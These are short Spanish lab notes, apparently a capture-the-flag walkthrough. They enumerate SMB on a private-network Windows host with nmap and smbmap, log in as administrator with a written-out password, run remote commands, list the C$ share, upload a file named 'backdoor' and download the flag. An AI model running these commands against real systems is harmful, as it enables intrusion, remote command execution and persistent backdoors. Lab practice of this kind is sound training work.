# Ciber

 Primero hacemos un nmap
		`nmap 192.168.18.47`
1. Hacemos nmap más detallado
		`nmap -p445 --script smb* 192.168.18.47`
 2. Utilizamos smbmap:
		 `smbmap -u guest -p "" -d . -H 192.168.18.47`
 3. Ahora como administrador:
 		`smbmap -u administrator -p Temporal.23! -d . -H 192.168.18.47`
 4. Ejecutamos comandos:
			`smbmap -u administrator -p Temporal.23! -H 192.168.18.47 -x whoami` 
			`smbmap -u administrator -p Temporal.23! -H 192.168.18.47 -x "ping 192.168.18.30"`
			`tcpdump -niv enp0s5 icmp`
 5. Listar discos:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! -L`
 6. Listar contenidos de un disco:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! -r C$`
 7. Subir un backdoor:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! --upload "./backdoor" "C$\backdoor"`
8. Nos bajamos la flag:
            `smbmap -H 192.168.18.47 -u administrator -p Temporal.23! --download "C$\flag.txt"`
           
